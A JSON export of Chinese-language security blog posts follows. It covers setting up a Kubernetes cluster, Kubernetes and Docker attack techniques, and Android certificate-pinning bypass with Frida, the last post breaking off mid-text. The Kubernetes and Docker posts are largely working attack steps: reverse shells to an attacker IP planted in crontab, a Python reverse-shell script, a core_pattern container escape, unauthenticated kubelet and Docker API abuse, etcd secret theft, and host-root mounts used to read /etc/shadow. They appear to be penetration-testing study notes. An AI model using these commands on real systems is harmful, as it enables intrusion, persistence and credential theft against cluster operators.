[{"id":"057dca3af5aa739fb2629cb762787844","title":"云攻防-K8S搭建","content":"云攻防-k8s手动搭建国内网络环境 优化的 CentOS 7 部署 Kubernetes 集群详细步骤,及常见问题\n一、环境准备（所有节点执行）1. 配置主机名与 hosts 解析shell# Master 节点\nhostnamectl set-hostname k8s-master\n \n# Worker 节点（如 node1）\nhostnamectl set-hostname k8s-node1\n \n# 所有节点编辑 /etc/hosts\ncat &lt;&lt;EOF &gt;&gt; /etc/hosts\n&lt;Master节点内网IP&gt; k8s-master\n&lt;Worker节点内网IP&gt; k8s-node1\nEOF2. 关闭防火墙、SELinux 和 Swapshellsystemctl stop firewalld &amp;&amp; systemctl disable firewalld\nsetenforce 0\nsed -i &#39;s/^SELINUX=enforcing$/SELINUX=permissive/&#39; /etc/selinux/config\nswapoff -a\nsed -i &#39;/ swap / s/^\\(.*\\)$/#\\1/g&#39; /etc/fstab  # 永久关闭 Swap3. 配置内核参数shellcat &lt;&lt;EOF &gt; /etc/sysctl.d/k8s.conf\nnet.bridge.bridge-nf-call-ip6tables = 1\nnet.bridge.bridge-nf-call-iptables = 1\nnet.ipv4.ip_forward = 1\nEOF\nsysctl --system4. 加载内核模块shellmodprobe br_netfilter\nmodprobe overlay二、安装容器运行时（所有节点执行）CentOS 7 yum 无法使用\nCentOS 7 仓库已经被归档，当前的镜像地址无法找到所需的文件。CentOS 7 的官方支持已经结束，部分仓库已被移至归档库。这导致了 yum 命令无法找到所需的元数据文件。CentOS 7 的官方仓库在 2024 年 6 月 30 日之后已经停止维护。因此，使用最新的 CentOS 7 官方仓库可能会遇到问题。\n参考文章：\nhttps://blog.csdn.net/weixin_68792404/article/details/147272888\n解决方法:\nshellcd /etc/yum.repos.d\ncp  CentOS-Base.repo   CentOS-Base.repo.backup\nvi CentOS-Base.repo\n修改内容\n# CentOS-Base.repo\n#\n# The mirror system uses the connecting IP address of the client and the\n# update status of each mirror to pick mirrors that are updated to and\n# geographically close to the client.  You should use this for CentOS updates\n# unless you are manually picking other mirrors.\n#\n# If the mirrorlist= does not work for you, as a fall back you can try the \n# remarked out baseurl= line instead.\n#\n#\n \n[base]\nname=CentOS-$releasever - Base\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=os&amp;infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/os/$basearch/\n#baseurl=http://vault.centos.org/7.9.2009/x86_64/os/\nbaseurl=http://vault.centos.org/7.9.2009/os/$basearch/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7\n \n#released updates \n[updates]\nname=CentOS-$releasever - Updates\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=updates&amp;infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/updates/$basearch/\n#baseurl=http://vault.centos.org/7.9.2009/x86_64/os/\nbaseurl=http://vault.centos.org/7.9.2009/updates/$basearch/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7\n \n#additional packages that may be useful\n[extras]\nname=CentOS-$releasever - Extras\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=extras&amp;infra=$infra\n#$baseurl=http://mirror.centos.org/centos/$releasever/extras/$basearch/\n#baseurl=http://vault.centos.org/7.9.2009/x86_64/os/\nbaseurl=http://vault.centos.org/7.9.2009/extras/$basearch/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7\n \n#additional packages that extend functionality of existing packages\n[centosplus]\nname=CentOS-$releasever - Plus\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=centosplus&amp;infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/centosplus/$basearch/\n#baseurl=http://vault.centos.org/7.9.2009/x86_64/os/\nbaseurl=http://vault.centos.org/7.9.2009/centosplus/$basearch/\ngpgcheck=1\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7保存后执行\nshellsudo yum clean all\nsudo yum makecache然后执行以下命令\nshellcurl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo\n \nsudo yum clean all\nsudo yum makecache1. 安装 Docker（国内镜像加速）shell# 使用阿里云 Docker 仓库\nyum install -y yum-utils\nyum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.reposhell# 安装指定版本 Docker\nyum install -y docker-ce-20.10.23 docker-ce-cli-20.10.23 containerd.ioshell# 配置 Docker 镜像加速和 cgroup 驱动\nmkdir -p /etc/docker\ncat &lt;&lt;EOF &gt; /etc/docker/daemon.json\n&#123;\n  &quot;registry-mirrors&quot;: [&quot;https://&lt;你的阿里云镜像加速地址&gt;.mirror.aliyuncs.com&quot;],\n  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],\n  &quot;log-driver&quot;: &quot;json-file&quot;,\n  &quot;log-opts&quot;: &#123;&quot;max-size&quot;: &quot;100m&quot;&#125;,\n  &quot;storage-driver&quot;: &quot;overlay2&quot;\n&#125;\nEOFshell# 启动 Docker\nsystemctl enable docker &amp;&amp; systemctl start docker三、安装 Kubernetes 组件（所有节点执行）1. 配置阿里云 Kubernetes 仓库shellcat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/\nenabled=1\ngpgcheck=0\nrepo_gpgcheck=0\nEOF2. 安装 kubeadm、kubelet、kubectlshell# 指定版本安装（示例版本 1.28.2）\nyum install -y kubelet-1.28.2 kubeadm-1.28.2 kubectl-1.28.2 --disableexcludes=kubernetes\n \n# 启动 kubelet\nsystemctl enable kubelet &amp;&amp; systemctl start kubelet四、初始化 Master 节点安装网络插件:\nshell#Flannel\nkubectl apply -f https://raw.githubusercontent.com/flannel-io/flannel/master/Documentation/kube-flannel.yml\nkubectl get pods -n kube-system\n#Calico\ncurl -O https://raw.githubusercontent.com/projectcalico/calico/v3.27.0/manifests/calico.yaml\nsed -i &#39;s#docker.io/calico/#registry.cn-hangzhou.aliyuncs.com/calico_community/#g&#39; calico.yaml\nkubectl apply -f calico.yamlKubernetes 从 1.24 版本开始已移除对 Docker 的直接支持，必须通过 cri-dockerd 适配器实现兼容。\n安装 cri-dockerd 适配器（所有节点安装）\nshell# 下载最新版 cri-dockerd\nwget https://github.com/Mirantis/cri-dockerd/releases/download/v0.3.7/cri-dockerd-0.3.7.amd64.tgzshell# 解压并安装\ntar xvf cri-dockerd-0.3.7.amd64.tgz\nsudo mv cri-dockerd/cri-dockerd /usr/local/bin/\nsudo chmod +x /usr/local/bin/cri-dockerdshell \n# 创建 systemd 服务文件\ncat &lt;&lt;EOF | sudo tee /usr/lib/systemd/system/cri-docker.service\n[Unit]\nDescription=CRI Interface for Docker\nAfter=network.target docker.service\nRequires=docker.service\n \n[Service]\nExecStart=/usr/local/bin/cri-dockerd --container-runtime-endpoint unix:///var/run/cri-dockerd.sock\nRestart=on-failure\n \n[Install]\nWantedBy=multi-user.target\nEOFshell# 启动服务\nsudo systemctl daemon-reload\nsudo systemctl enable cri-docker\nsudo systemctl start cri-docker配置 kubelet 使用 Docker\n创建 kubelet 配置文件\nshellsudo mkdir -p /etc/systemd/system/kubelet.service.d\ncat &lt;&lt;EOF | sudo tee /etc/systemd/system/kubelet.service.d/0-cri-docker.conf\n[Service]\nEnvironment=&quot;KUBELET_EXTRA_ARGS=--container-runtime=remote --container-runtime-endpoint=unix:///var/run/cri-dockerd.sock&quot;\nEOF初始化 master 节点\nshellsudo kubeadm init \\\n  --image-repository registry.aliyuncs.com/google_containers \\\n  --apiserver-advertise-address 内网master的ip \\\n  --pod-network-cidr=10.244.0.0/16 \\        \n  --token-ttl 0 \\\n  --cri-socket unix:///var/run/cri-dockerd.sock  # 关键参数！成功后会输出以下命令，保存供 Worker 节点加入：\nshellmkdir -p $HOME/.kube\nsudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config\nsudo chown $(id -u):$(id -g) $HOME/.kube/confignode 加入集群 这里加入集群的命令每个人都不一样，可以登录 master 节点，使用 kubeadm token create –print-join-command 来获取。获取后在 node 主机下执行\nshellkubeadm join master节点ip:6443 --token s1dthx.saz58vfk2vjaxqcj \\\n    --discovery-token-ca-cert-hash sha256:6304e0c416ab6ab41f5de0aad71428c68099900063526f509c364237fe120051 验证集群\nkubectl get nodes\nkubectl get pods -n kube-system\n如果存在master节点显示Ready了,但node节点是noready，说明了clicoa的网卡没有就绪，需要拉镜像\n实在没办法，咸鱼20块钱搞定\n","slug":"云攻防-k8s搭建","date":"2025-05-17T09:03:45.056Z","categories_index":"云安全","tags_index":"云安全","author_index":"Hao"},{"id":"2d7ab8d810fa55a7f8f329a080d4b514","title":"云攻防-自动化工具CDK","content":"云攻防-自动化工具CDKhttps://github.com/cdk-team/CDK\n概述\nCDK 是一个开源的容器渗透工具包，旨在提供对各种精简容器的稳定利用，且无需依赖任何操作系统。它配备了实用的网络工具和许多强大的 PoC&#x2F;EXP，可帮助您轻松脱离容器并接管 K8s 集群。\n","slug":"云攻防-自动化工具CDK","date":"2025-05-17T09:01:52.604Z","categories_index":"tools","tags_index":"tools","author_index":"Hao"},{"id":"aa2cc9f18c0295fd4c228dc62555a6a1","title":"云攻防-K8S安全","content":"云攻防-K8S安全Kubernetes 是一个开源的，用于编排云平台中多个主机上的容器化的应用，目标是让部署容器化的应用能简单并且高效的使用，提供了应用部署，规划，更新，维护的一种机制。其核心的特点就是能够自主的管理容器来保证云平台中的容器按照用户的期望状态运行着，管理员可以加载一个微型服务，让规划器来找到合适的位置，同时，Kubernetes在系统提升工具以及人性化方面，让用户能够方便的部署自己的应用。\n参考：\nhttps://blog.csdn.net/qq_34101364/article/details/122506768\n\n\n\nK8S 集群攻击点随着越来越多企业开始上云的步伐，在攻防演练中常常碰到云相关的场景，例：公有云、\n私有云、混合云、虚拟化集群等。以往渗透路径「外网突破 -&gt; 提权 -&gt; 权限维持 -&gt; 信息收\n集 -&gt; 横向移动 -&gt; 循环收集信息」，直到获得重要目标系统。但随着业务上云以及虚拟化技\n术的引入改变了这种格局，也打开了新的入侵路径，例如：\n\n1、通过虚拟机攻击云管理平台，利用管理平台控制所有机器\n\n2、通过容器进行逃逸，从而控制宿主机以及横向渗透到 K8s Master 节点控制所有容器\n\n3、利用 KVM-QEMU &#x2F; 执行逃逸获取宿主机，进入物理网络横向移动控制云平台\n\n\n目前互联网上针对云原生场景下的攻击手法零零散散的较多，仅有一些厂商发布过相关矩\n阵技术，但没有过多的细节展示，本文基于微软发布的 Kubernetes 威胁矩阵进行扩展，介绍相关的具体攻击方法。\n参考：\nhttps://mp.weixin.qq.com/s/yQoqozJgP8F-ad24xgzIPw\nhttps://mp.weixin.qq.com/s/QEuQa0KVwykrMzOPdgEHMQ\ncat &#x2F;proc&#x2F;1&#x2F;cgroup &#x2F;&#x2F; 查看是否存在 K8S\n一，api 未授权访问1， 攻击 8080 端口API Server 未授权访问旧版本的 k8s 的 API Server 默认会开启两个端口：8080 和 6443。6443 是安全端口，安全端口使用 TLS 加密；但是 8080 端口无需认证，仅用于测试。6443 端口需要认证，且有 TLS 保护。(k8s&lt;1.16.0) 新版本 k8s 默认已经不开启 8080。需要更改相应的配置\nshellcd /etc/kubernetes/manifests/\n--insecure-port=8080\n--insecure-bind-address=0.0.0.0shellkubectl.exe -s 192.168.139.130:8080 get nodes\nkubectl.exe -s 192.168.139.130:8080 get pods\n//连接后创建test.yaml文件\nkubectl -s 192.168.139.130:8080 create -f test.yaml\n//同过api server 创建test.yaml文件来创建一个新的pod\nkubectl -s 192.168.139.130:8080--namespace=default exec -it test \nbash \necho -e &quot;***** root bash -i &gt;&amp; /dev/tcp/192.168.139.128/4444 0&gt;&amp;1\\n&quot; &gt;&gt; /mnt/etc/crontab\n//写入定时任务，执行反弹shelltest.yaml 中的内容\n\n2、攻击 6443 端口API Server 未授权访问一些集群由于鉴权配置不当，将”system:anonymous” 用户绑定到”cluster-admin” 用户组，从而使 6443 端口允许匿名用户以管理员权限向集群内部下发指令。\nshellkubectl create clusterrolebinding system:anonymous\n--clusterrole=cluster-admin            --user=system:anonymous攻击时访问 6443 端口，存在此情况那么可以尝试攻击\n\nshell-创建恶意 pods\nhttps://192.168.139.130:6443/api/v1/namespaces/default/pods/\n//构建数据包POST\n&#123;&quot;apiVersion&quot; : &quot;v1&quot; ,&quot;kind&quot; : &quot;Pod&quot; , &quot;metadata&quot;: &#123;&quot;annotations&quot; : &#123;&quot;kubect.kubernetes.io/last-applied-configuration&quot; :&quot;&#123;\\&quot;apiVersion\\&quot;:\\&quot;v1\\,\\&quot;kind\\&quot; : \\&quot;Pod\\&quot; ,\\&quot;metadata\\&quot;: &#123;\\&quot;annotations\\&quot;: &#123;&#125; ,\\&quot;name\\&quot;:\\&quot;tes02\\&quot; ,\\&quot;namespace\\&quot;:\\&quot;default\\&quot;&#125;,\\&quot;spec\\&quot;: &#123;\\&quot;containers\\&quot; :[&#123;\\&quot;image\\&quot; : \\&quot;nginx:1.14.2\\&quot;,\\&quot;name\\&quot;:\\&quot;test02\\&quot;,\\&quot;volumeMounts\\&quot; :[&#123;\\&quot;mountPath\\&quot;:\\&quot;/host\\&quot;,\\&quot;name\\&quot;:\\&quot;host\\&quot;&#125;]&#125;],\\&quot;volumes\\&quot;:[&#123;\\&quot;hostPath\\&quot;:&#123;\\&quot;path\\&quot; :\\&quot;/\\&quot; ,\\&quot;type\\&quot;:\\&quot;Directory\\&quot;&#125; ,\\&quot;name\\&quot;:\\&quot;host\\&quot; &#125;]&#125; &#125;\\n&quot;&#125;&quot;name&quot; : &quot;test02&quot; ,&quot;namespace&quot; :&quot;default&quot;&#125;,&quot;spec&quot; : &#123;&quot;containers&quot; :[&#123;&quot;image&quot;:&quot;nginx:1.14.2&quot;,&quot;name&quot;:&quot;test02&quot;,&quot;volumeMounts&quot; :[&#123;&quot;mountPath&quot;:&quot;/host&quot; ,&quot;name&quot; :&quot;host&quot; &#125; ]&#125;],&quot;volumes&quot; : [ &#123;&quot;hostPath&quot; : &#123;&quot;path&quot; :&quot;/&quot; ,&quot;type&quot;&quot;Directory&quot;&#125;,&quot;name&quot;:&quot;host&quot;&#125;]&#125; &#125;shell-连接判断pods\nkubectl --insecure-skip-tls-verify -s https://192.168.139.130:6443 get pods\n-连接执行pods\nkubectl --insecure-skip-tls-verify -s https://192.168.139.130:6443 --namespace=default exec -it test02 bash操作与上面一样，写入反弹 shell\n3，攻击 10250 端口：kubelet 未授权访问与 API Server 类似，Kubelet 也运行着 API 服务，默认服务端口为 10250 和 10248\nKubelet 存在的风险主要也是未授权访问，如果 Kubelet 存在未授权访问，就可以控制所在节点的权限。\n条件：\nshell/var/lib/kubelet/config.yaml\n修改 authentication的anonyous为true  \n将authorization mode 修改为 AlwaysAllow访问页面时，存在此数据代表存在漏洞利用执行命令，需要利用三个参数：\nnamespace，pod，container\n访问 https://192.168.139.132:10250/runningpods\n使用谷歌 FeHelper 插件可以将 json 数据更加直观的看到\n执行模板：\nshellcurl -X POST -k &quot;https://192.168.139.132:10250/run/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt;&quot; -d &quot;cmd=id&quot;构造触发：\nshellhttps://192.168.139.132:10250/run/default/test02/test02\ncurl -X POST -k &quot;https://192.168.139.132:10250/run/default/test02/test02&quot; -d &quot;cmd=id&quot;二，etcd 未授权访问（利用条件苛刻）默认通过证书认证，主要存放节点的数据，如一些 token 和证书。\n第一种：没有配置指定–client-cert-auth 参数打开证书校验，暴露在外 etcd 服务存在未授权访问风险。\n\n暴露外部可以访问，直接未授权访问获取 secrets 和 token 利用\n\n第二种: 在打开证书校验选项后，通过本地 127.0.0.1:2379 可免认证访问 Etcd 服务，但通过其他地址访问要携带 cert 进行认证访问，一般配合 ssrf 或其他利用，较为鸡肋。\n\n只能本地访问，直接未授权访问获取 secrets 和 token 利用\n\n第三种: 实战中在安装 k8s 默认的配置 2379 只会监听本地，如果访问没设置 0.0.0.0 暴露，那么也就意味着最多就是本地访问，不能公网访问，只能配合 ssrf 或其他。\n\n只能本地访问，利用 ssrf 或其他进行获取 secrets 和 token 利用\n\n复现利用:暴露 etcd 未授权 -&gt; 获取 secrets&amp;token-&gt; 通过 token 访问 API-Server 接管\nSSRF 解决限制访问 -&gt; 获取 secrets&amp;token-&gt; 通过 token 访问 API-Server 接管\nV2&#x2F;v3 版本利用参考:https://www.cnblogs.com/qtzd/p/k8s etcd.html\n启动:kubectl createf recommended.yaml\nV2 版本利用:\n直接访间 http://ip:2379/v2/keys/?recursive=true，可以看到所有的 key-value 值。(secrets token)\nV3 版本利用：\n1、连接提交测试\nshell./etcdctl --endpoints=192.168.139.136:23791 get / --prefix\n./etcdctl --endpoints=192.168.139.136:23791 put /testdir/testkey1&quot;Hello world1&quot;\n./etcdctl --endpoints=192.168139.136:23791 put /testdir/testkey2&quot;Hello world2&quot;\n./etcdctl --endpoints=192.168.139.136:23791 put /testdir/testkey3&quot;Hello world3&quot;2、获取 k8s 的 secrets:\nshell./etcdctl --endpoints=192.168.139.136:23791 get / --prefix--keys-only | grep /secrets/3、读取 service account token:.\nshell./etcdctl --endpoints=192.168.139.136:23791 get /--prefix --keys-only | grep /secrets/kube-system/clusterrole\n./etcdctl--endpoints-192.168.139.136:23791 get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-jdp5z4、通过 token 访问 API-Server，获取集群的权限:\nshellkubectl --insecure-skip-tls-verify-s https://127.0.0.1:6443/ -token=&quot;ey...&quot; -n kube-system get pods三，Dashboard 未授权访问默认端口：8001配置不当导致 dashboard 未授权访问，通过 dashboard 我们可以控制整个集群。kubernetes dashboard 的未授权其实分两种情况:一种是在本身就存在着不需要登录的 http 接口，但接口本身并不会暴露出来，如接口被暴露在外，就会导致 dashboard 未授权。另外一种情况则是开发嫌登录麻烦，修改了配置文件，使得安全接口 https 的 dashboard 页面可以跳过登录。\n漏洞复现：\n用户开启 enable-skip-login 时可以在登录界面点击跳过登录进 dashboard*\nKubernetes-dashboard 绋定 cluster-admin (拥有管理集群的最高权限)\n启动:kubectl createf recommended.yaml\n进入页面后，登录旁都 Skip, 可跳过登录直接进入\n\n后逃逸方法与上面类似\n五，Configfile 鉴权文件泄漏攻击者通过 webshell、Github 等拿到了 K8s 配置的 Config 文件，操作集群，从而接管所有容器。K8s configfile 作为 K8s 集群的管理凭证，其中包含有关 K8s 集群的详细信息 (API Server、登录凭证)。如果攻击者能够访问到此文件 (如办公网员工机器入侵、泄露到 Github 的代码等)，就可以直接通过 API Server 接管 K8s 集群，带来风险隐患。用户凭证保存在 kubeconfig 文件中，通过以下顺序来找到 kubeconfig 文件:\n\n1，如果提供了–kubeconfig 参数，就使用提供的 kubeconfig\n\n2，文件如果没有提供–kubeconfig 参数，但设置了环境变量 SKUBECONFIG，则使用该环境变量提供的 kubeconfig 文件\n\n3，如果以上两种情况都没有，kubectl 就使用默认的 kubeconfig 文件~&#x2F;.kube&#x2F;config\n\n\n1，使用 config 文件连接:kubectl -s https://192.168.139.130:6443/ –kubeconfig&#x3D;config –insecure-skip-tls-verify&#x3D;true get nodes\n2、上传利用 test.yaml 创建 pod\nshellkubectl apply -f test.yaml -n default--kubeconfig=config3，连接 pod 后进行容器挂载逃逸\nshellkubectl exec -it test bash -n default--kubeconfig=config\ncd/mnt\nchroot . bash六，Kubectl Proxy 不安全配置当运维人员需要某个环境暴露端口或者 IP 时，会用到 Kubectl Proxy，使用 kubectl proxy 命令就可以使 API server 监听在本地的 xxxx 端口上\n环境搭建:\nshellkubectl--insecure-skip-tls-verify proxy-accept-hosts=^.*$ --address=0.0.0.0 --port=8009\n//暴露8009端口七，K8S 的污点横向移动在 K8S 中，利用污点（Taint）进行横向移动渗透是指攻击者通过操纵或绕过集群中的污点和容忍（Toleration）机制，将恶意负载（Pod）调度到原本受保护的节点上，从而突破隔离并进一步渗透集群。污点和容忍是 K8S 的合法功能，设计目的是增强安全性。问题通常源于错误的权限分配（如过宽的 RBAC 策略）或不安全的容忍配置（如 Pod 容忍所有污点）。\n设置污点:\nshell设置污点：\nkubectl taint nodes nodel xtz=valuel:NoSchedule通过以下命令查看节点上的污点设置：\nshellkubectl describe node &lt;节点名称&gt;\nTaints中 NoSchodule-为没有污点，none也没有污点查看是否存在污点：\nshellkubectl describe node | grep &#39;Taints&#39;容忍（Toleration）\n容忍是 Pod 上设置的属性，允许 Pod 被调度到带有特定污点的节点。\n创建带有容忍参数的 Pod (必要时可以修改 Yaml 使 Pod 增加到特定的 Node 上去)\nshell#通过cat写入1.yaml配置文件\ncat &gt; 1.yaml &lt;&lt; EOF\napiVersion: v1\nkind: Pod\nmetadata:\n  name: control-master-15\nspec:\n  tolerations:\n    - key: node-role.kubernetes.io/master  //使Pod增加到特定的Node上去\n      operator: Exists\n      effect: NoSchedule\n  containers:\n    - name: control-master-15\n      image: ubuntu:18.04\n      command: [&quot;/bin/sleep&quot;, &quot;3650d&quot;]\n      volumeMounts:\n      - name: master\n        mountPath: /master\n  volumes:\n  - name: master\n    hostPath:\n      path: /\n      type: Directory\nEOFshell#创建Pod\nkubectl create -f control-master.yaml\n \n#部署情况\nkubectl get deploy -o wide\n \n#Pod详情\nkubectl get pod -o wide获得 Master 控制端\nshellkubectl exec control-master-15 -it bash\nchroot /master bash\nls -al\ncat /etc/shadow","slug":"云攻防-K8S安全","date":"2025-05-17T08:38:05.197Z","categories_index":"云安全","tags_index":"云安全","author_index":"Hao"},{"id":"c1542731ca718f81298fabe69ac4f53f","title":"云原生-docker","content":"云原生-docker拿到权限：判断是否为容器\nhttps://blog.csdn.net/qq_23936389/article/details/131486643\n三种安全容器逃逸：\n\n特权模式启动导致（不安全启动 适用于 java jsp 高权限无需提权 还要提权才能逃逸）\n危险挂载启动导致（危险启动 适用于 java jsp 高权限无需提权 还要提权才能逃逸）-docker 自身 &amp; 系统漏洞（软件漏洞和系统漏洞 都可用）https://wiki.teamssix.com/cloudnative/\n\n容器逃逸 - 特权模式https://wiki.teamssix.com/CloudNative/Docker/docker-privileged-escape.html\n启动 docker 容器：\nshelldocker run --rm --privileged=true -it alpine  //启用--privileged=true，container内的root拥有真正的root权限，可能让攻击者利用此进行容器逃逸判断是否为容器环境：\nshellcat /proc/1/cgroup | grep -qi docker &amp;&amp; echo &quot;Is Docker&quot; || echo &quot;Not Docker&quot;如果返回 Is Docker，说明当前是 Docker 容器环境，反之亦然。\n判断特权模式：\nshellcat /proc/self/status | grep -qi &quot;0000003fffffffff&quot; &amp;&amp; echo &quot;Is privileged mode&quot; || echo &quot;Not privileged mode&quot;\n或者\ncat /proc/self/status | grep CapEff 在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为 0000003fffffffff 或者是 0000001fffffffff\n方法一：\n查看挂载磁盘设备：\nshellfdisk -l在容器内部执行以下命令，将宿主机文件挂载到 &#x2F;test 目录下：\nshellmkdir /test &amp;&amp; mount /dev/sda1 /test尝试访问宿主机 shadow 文件，可以看到正常访问\nshellcat /test/etc/shadow方法二\nshellmount /dev/sda1 /mnt\nchroot /mnt adduser john通过新添加的用户登录\n容器逃逸 - 挂载 逃逸https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html\n启动容器：\nshelldocker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu //procfs\ndocker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu //Socket挂载 Docker Socket 逃逸 ：执行以下命令，如果返回 Docker Socket is mounted. 说明当前挂载了 Docker Socket\nshellls /var/run/ | grep -qi docker.sock &amp;&amp; echo &quot;Docker Socket is mounted.&quot; || echo &quot;Docker Socket is not mounted.&quot;\nls -lah /var/run/docker.sock在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部\nshelldocker run -it -v /:/host ubuntu /bin/bash在新的容器内执行 chroot，将根目录切换到挂载到宿主机的根目录\nshellchroot /host挂载 procfs 逃逸 ：执行以下命令，如果返回 Procfs is mounted. 说明当前挂载了 procfs\nshellfind / -name core_pattern 2&gt;/dev/null | wc -l | grep -q 2 &amp;&amp; echo &quot;Procfs is mounted.&quot; || echo &quot;Procfs is not mounted.&quot;如果找到两个 core_pattern 文件，那可能就是挂载了宿主机的 procfs\nshellfind / -name core_pattern找到当前容器在宿主机下的绝对路径\nshellcat /proc/mounts | xargs -d &#39;,&#39; -n 1 | grep workdir\n//为绝对路/var/lib/docker/overlay2/5717cb9154218ec49579ae338cd1c236694d6a377d61fd6d17e11e49d1b1baad/merged安装 vim 和 gcc\nshellapt-get update -y &amp;&amp; apt-get install vim gcc -y\nvim /tmp/.t.py创建一个反弹 Shell 的 py 脚本\nshell#!/usr/bin/python3\nimport  os\nimport pty\nimport socket\nlhost = &quot;172.16.214.1&quot;\nlport = 4444\ndef main():\n   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n   s.connect((lhost, lport))\n   os.dup2(s.fileno(), 0)\n   os.dup2(s.fileno(), 1)\n   os.dup2(s.fileno(), 2)\n   os.putenv(&quot;HISTFILE&quot;, &#39;/dev/null&#39;)\n   pty.spawn(&quot;/bin/bash&quot;)\n   # os.remove(&#39;/tmp/.t.py&#39;)\n   s.close()\nif __name__ == &quot;__main__&quot;:\n   main()给 Shell 赋予执行权限\nshellchmod 777 .t.py写入反弹 shell 到目标的 proc 目录下\nshellecho -e &quot;|/var/lib/docker/overlay2/5717cb9154218ec49579ae338cd1c236694d6a377d61fd6d17e11e49d1b1baad/merged/tmp/.t.py \\rcore    &quot; &gt;  /host/proc/sys/kernel/core_pattern在攻击主机上开启一个监听，然后在容器里运行一个可以崩溃的程序\nshellvim t.c\n#include&lt;stdio.h&gt;\nint main(void)  &#123;\n   int *a  = NULL;\n   *a = 1;\n   return 0;\n&#125;\ngcc t.c -o t\n./tDocker 远程 API 未授权访问逃逸docker remote api 可以执行 docker 命令，docker 守护进程监听在 0.0.0.0，可直接调用 API 来操作 docker\n将 docker 守护进程监听在 0.0.0.0\nshelldockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375检测：\nshellIP=`hostname -i | awk -F. &#39;&#123;print $1 &quot;.&quot; $2 &quot;.&quot; $3 &quot;.1&quot;&#125;&#39; ` &amp;&amp; wget http://$IP:2375如果返回 404 说明存在\n列出容器信息\nshellcurl http://&lt;target&gt;:2375/containers/json查看容器\nshelldocker -H tcp://&lt;target&gt;:2375 ps -a新运行一个容器，挂载点设置为服务器的根目录挂载至 &#x2F;mnt 目录下。\nshelldocker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash在容器内执行命令，将反弹 shell 的脚本写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root\nshellecho &#39;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.1.1.214/12345 0&gt;&amp;1&#39; &gt;&gt; /mnt/var/spool/cron/crontabs/root本地监听端口，获取对方宿主机 shell。\n","slug":"云攻防-云原生-docker","date":"2025-05-17T08:28:23.756Z","categories_index":"云安全","tags_index":"云安全","author_index":"Hao"},{"id":"a9cc9e80be87d52a4207fb04988da523","title":"APP单项认证","content":"APP单项认证常见的 Android 安全工具\n移动安全框架 (MobSF) 是一种自动化的一体化移动应用程序(Android&#x2F;iOS&#x2F;Windows) 渗透测试、恶意软件分析和安全评估框架，能够执行静态和动态分析。MobSF 支持移动应用程序二进制文件（APK、XAPK、IPA 和 APPX）以及压缩源代码，并提供 REST API 以与您的 CI&#x2F;CD 或 DevSecOps 管道无缝集成。动态分析器可帮助您执行运行时安全评估和交互式仪器测试。\n\n-Mobexler 是基于 Elementary OS 的定制虚拟机，旨在帮助进行 Android 和 iOS 应用程序的渗透测试。Mobexler 预装了各种开源工具，脚本，黑客必备软件等，这些都是安全测试 Android 和 iOS 应用程序所必需的。https://mobexler.com/\nAPP 双向认证绕过–r0capture 仅限安卓平台，测试安卓 7、8、9、10、11 可用 ；无视所有证书校验或绑定，不用考虑任何证书的事情；通杀 TCP&#x2F;IP 四层模型中的应用层中的全部协议；通杀协议包括：Http,WebSocket,Ftp,Xmpp,Imap,Smtp,Protobuf 等、及它们的 SSL版本；通杀所有应用层框架，包括 HttpUrlConnection、Okhttp1&#x2F;3&#x2F;4、Retrofit&#x2F;Volley 等等；无视加固，不管是整体壳还是二代壳或 VMP，不考虑加固事情\n–Firda 是一款易用的跨平 Hook 工具， Java 层到 Native 层的 Hook 无所不能，是一种 动态 的插桩工具，可以插入代码到原生 App 的内存空间中，动态的去监视和修改行为，原生平台包括 Win、Mac、Linux、Android、iOS 全平台。\n方案 1:Firda+rOcapture+WireShark（抖音）https://github.com/r0ysue/rOcapture模拟器执行：.&#x2F;frida-server获取包名：ls&#x2F;data&#x2F;data 或 Apk 资源器查看python rOcapture.py -U -f 包名 -p xxxx.pcap\n方案 2:Firda+HOOK-JS+BurpSuitehttps://github.com/apkunpacker/FridaScripts模拟器执行：.&#x2F;frida-server本地执行：frida-U-f 包名 - 1hookjs 文件\n方案 3：导入证书利用场景：能反编译，有证书文件1、解压获取 apk 的证书文件2、反编译后得到证书文件的密钥3、Burp 导入证书后实现对应抓包\nhttps://github.com/frida/frida/releases1、本地安装 Fridapip install fridapip install frida-tools\nADB 就是连接 Android 手机与 PC 端的桥梁，所以 ADB 又称为安卓调试桥（注意：是安卓，不是 